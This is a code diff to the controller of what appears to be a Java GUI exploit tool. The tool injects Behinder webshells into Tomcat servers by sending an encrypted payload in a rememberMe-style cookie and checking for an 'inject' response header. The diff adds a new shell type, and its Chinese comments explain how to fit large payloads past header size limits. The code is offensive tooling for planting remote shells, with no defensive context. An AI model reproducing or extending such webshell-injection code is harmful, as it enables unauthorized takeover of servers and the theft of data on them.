@@ -150,7 +150,7 @@ public class Controller {
         serverType.setValue("Tomcat7");
         serverType.setItems(serverTypeData);
 
-        ObservableList<String> shellTypeData = FXCollections.observableArrayList("Behinder","Behinder1");
+        ObservableList<String> shellTypeData = FXCollections.observableArrayList("Behinder","Behinder1","Behinder2");
         shellType.setValue("Behinder");
         shellType.setItems(shellTypeData);
 
@@ -360,6 +360,9 @@ public class Controller {
 
             System.out.println("encryptData:"+encryptData.length());
 
+         /*   if (method.equals(Constants.METHOD_GET)) {
+                header.put("Content-Type","application/x-www-form-urlencoded");
+            }*/
 
             //解决长度问题，把大payload放post包提交
             String postData="";
@@ -379,6 +382,7 @@ public class Controller {
             //请求包header超过8k会报header too large错误
             //此处大坑，有时候需要urlencode
             header.put("cookie", rmeValue + "=" + encryptData);
+
             if (isShowPayload.isSelected()) {
                 Controller.logUtil.printData(header.toString());
                 Controller.logUtil.printData(params.toString());
@@ -392,7 +396,7 @@ public class Controller {
             url = url+"?test=ok";
             logUtil.printInfoLog("开始检查注入状态",true);
             Response response = HttpTool.get1(url);
-            String data = response.getData();
+            //String data = response.getData();
             String header1 = response.getHeader().toString();
             //请求头包含inject：ok表示成功
             if (header1.contains("inject")) {
